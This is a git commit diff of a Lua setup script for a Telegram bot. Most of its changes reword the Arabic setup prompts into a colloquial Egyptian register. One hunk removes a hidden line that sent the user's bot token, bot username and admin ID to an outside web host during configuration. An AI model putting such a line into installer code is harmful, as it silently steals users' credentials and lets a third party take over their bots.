cbfc961ebcbb01663bd2b72ddf8afb109770ce83
Nizk Source <76686804+kiindi@users.noreply.github.com>
2021-04-02 22:43:43 +0200

    v1

--- YEMEN/Run.lua
+++ YEMEN/Run.lua
@@ -41,31 +41,31 @@ end
 
 function create_config(Token)
 if not Token then
-io.write('\n\27[1;33m￤ادخل التوكن  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
+io.write('\n\27[1;33m￤هات التوكن  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
 Token = io.read():gsub(' ','')
 if Token == '' then
-print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤يرجى التركيز وادخل التوكن مرة اخرى لانه يوجد خطأ ')
+print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤حضرتك انت مدخلتش حاجة ,دخل التوكن ')
 create_config()
 end
 Api_Token = 'https://api.telegram.org/bot'..Token
 local url , res = https.request(Api_Token..'/getMe')
 if res ~= 200 then
-print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n | التوكن الذي ادخلته خطا جرب مرة اخرى')
+print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ التوكن الي دخلته غلط جرب تاني')
 create_config()
 end
 local GetToken = JSON.decode(url)
 BOT_NAME = GetToken.result.first_name
 BOT_User = "@"..GetToken.result.username
-io.write('\n\27[1;36m￤تم ادخال التوكن     \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
+io.write('\n\27[1;36m￤تم ادخال التوكن شكرا    \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
 end
 io.write('\n\27[1;33m￤ ايدي المطور الاساسي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
 SUDO_USER = io.read():gsub(' ','')
 if SUDO_USER == '' then
-print('\n\27[1;31m￤ You Did not Enter USERID !\n￤يرجى التركيز وادخال ايدي المطور الاساسي ')
+print('\n\27[1;31m￤ You Did not Enter USERID !\n￤ يسطااا ايدي المطور الاساسي ركز شوية')
 create_config(Token)
 end 
 if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
-print('\n\27[1;31m￤ This is Not USERID !\n￤الايدي هذا ليس موجود ')
+print('\n\27[1;31m￤ This is Not USERID !\n￤الايدي ده مش موجود ')
 create_config(Token)
 end 
 print('('..SUDO_USER..')')
@@ -94,8 +94,7 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('kiindi-api.ml/lua/nizk/elnizk.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
-Cr_file = io.open("./inc/Token.txt", "w")
+Cr_file = io.open("./YEMEN/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
